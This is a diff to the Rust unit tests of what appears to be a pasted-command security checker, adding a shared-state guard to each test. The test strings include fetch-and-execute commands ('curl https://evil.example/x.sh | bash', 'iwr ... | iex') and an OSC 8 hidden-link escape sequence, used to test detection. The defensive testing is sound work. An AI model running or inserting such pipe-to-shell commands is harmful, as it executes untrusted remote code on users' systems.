@@ -360,6 +360,7 @@ mod tests {
     // sha mismatch → no finding.
     #[test]
     fn sha_mismatch_emits_nothing() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://evil.example/x.sh | bash";
         // Record's hash is for DIFFERENT content, so attribution fails.
         let rec = record_for(
@@ -387,6 +388,7 @@ mod tests {
     // fires at Info.
     #[test]
     fn non_utf8_paste_hashes_raw_bytes_not_lossy() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Valid ASCII command + one invalid UTF-8 byte (0xFF) in a trailing token.
         let mut raw = b"curl https://evil.example/x.sh -o x #".to_vec();
         raw.push(0xFF);
@@ -432,6 +434,7 @@ mod tests {
     // (c) matched + same host → no finding.
     #[test]
     fn matched_same_host_emits_nothing() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://docs.trusted.example/install.sh -o install.sh";
         let rec = record_for(content, "https://docs.trusted.example/page", false);
         let findings = check_with_record(
@@ -451,6 +454,7 @@ mod tests {
     // (d) matched + bare host mismatch → Info.
     #[test]
     fn matched_bare_host_mismatch_is_info() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://github.com/org/repo/releases/download/v1/tool -o tool";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let findings = check_with_record(
@@ -477,6 +481,7 @@ mod tests {
     // (e) matched + host mismatch + pipe-to-interpreter → High.
     #[test]
     fn matched_mismatch_with_pipe_is_high() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://evil.example/x.sh | bash";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         // The paste branch already assembled a PipeToInterpreter finding.
@@ -504,6 +509,7 @@ mod tests {
     // must match the whole pipe-to-shell family.
     #[test]
     fn matched_mismatch_with_curl_pipe_shell_is_high() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://evil.example/x.sh | bash";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let prior = [prior_finding(RuleId::CurlPipeShell)];
@@ -525,6 +531,7 @@ mod tests {
     // (e') hidden-text signal (record flag) → High.
     #[test]
     fn matched_mismatch_with_hidden_text_flag_is_high() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://other.example/install.sh -o install.sh";
         let rec = record_for(content, "https://docs.trusted.example/install", true);
         let findings = check_with_record(
@@ -542,6 +549,7 @@ mod tests {
     // (e'') hidden-text signal (prior ClipboardHidden finding) → High.
     #[test]
     fn matched_mismatch_with_prior_clipboard_hidden_is_high() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://other.example/install.sh -o install.sh";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let prior = [prior_finding(RuleId::ClipboardHidden)];
@@ -559,6 +567,7 @@ mod tests {
     // (f) matched + host mismatch + shortened URL → High.
     #[test]
     fn matched_mismatch_with_shortener_is_high() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://bit.ly/abc123 -o tool";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let findings = check_with_record(
@@ -580,6 +589,7 @@ mod tests {
     // (g) destination in allowed_install_domains → stays Info.
     #[test]
     fn matched_mismatch_destination_in_allowed_domains_stays_info() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://github.com/org/repo/releases/download/v1/tool -o tool";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let mut policy = empty_policy();
@@ -604,6 +614,7 @@ mod tests {
     // risk signal fires).
     #[test]
     fn matched_mismatch_destination_not_in_allowed_domains_is_high() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://random-host.example/install.sh -o install.sh";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let mut policy = empty_policy();
@@ -645,6 +656,7 @@ mod tests {
 
     #[test]
     fn no_destination_url_emits_nothing() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "echo hello world";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         assert!(check_with_record(
@@ -660,6 +672,7 @@ mod tests {
 
     #[test]
     fn source_url_without_host_emits_nothing() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://github.com/x -o x";
         let rec = record_for(content, "about:blank", false);
         assert!(check_with_record(
@@ -675,6 +688,7 @@ mod tests {
 
     #[test]
     fn www_prefix_is_equivalent_no_mismatch() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "curl https://www.docs.trusted.example/install.sh -o x";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         assert!(
@@ -693,6 +707,7 @@ mod tests {
 
     #[test]
     fn osc8_visible_url_mismatch_is_a_signal() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // OSC 8 visible `github.com`, target evil.example: the href is itself a
         // destination, so the mismatch fires AND the visible≠target signal
         // escalates to High (round-3 fix for the empty-destination early return).
@@ -721,6 +736,7 @@ mod tests {
     // the destination set" from the visible≠target escalation signal.
     #[test]
     fn osc8_only_destination_fires_bare_mismatch() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "run \x1b]8;;https://evil.example/install.sh\x1b\\click here\x1b]8;;\x1b\\";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let findings = check_with_record(
@@ -749,6 +765,7 @@ mod tests {
     // PowerShell (regression for the hardcoded-POSIX bug).
     #[test]
     fn powershell_paste_host_mismatch_is_detected() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content = "iwr https://evil.example/x.ps1 | iex";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         // The inline-download-execute rule would already be in `prior`.
@@ -777,6 +794,7 @@ mod tests {
     // A bare PowerShell mismatch (no risk signal) is still surfaced at Info.
     #[test]
     fn powershell_bare_mismatch_is_info() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let content =
             "iwr https://github.com/org/repo/releases/download/v1/tool.exe -OutFile tool.exe";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
